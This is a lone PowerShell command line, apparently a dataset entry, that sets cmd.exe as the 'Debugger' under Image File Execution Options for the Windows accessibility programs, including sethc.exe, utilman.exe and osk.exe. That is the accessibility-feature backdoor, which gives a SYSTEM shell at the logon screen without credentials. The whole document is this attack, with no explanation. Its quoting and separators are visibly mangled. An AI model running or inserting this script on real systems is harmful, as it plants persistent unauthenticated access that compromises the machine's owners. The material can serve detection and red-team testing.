"powershell.exe" & {$input_table = \""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\"".split(\"",\""), $Name = \""Debugger\"", $Value = \""C:\windows\system32\cmd.exe\"", Foreach ($item in $input_table){,   $item = $item.trim(),   $registryPath = \""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item\"",   IF(!(Test-Path $registryPath)),   {,     New-Item -Path $registryPath -Force,     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force,   },   ELSE,   {,     New-ItemProperty -Path $registryPath -Name $name -Value $Value,   }, }}
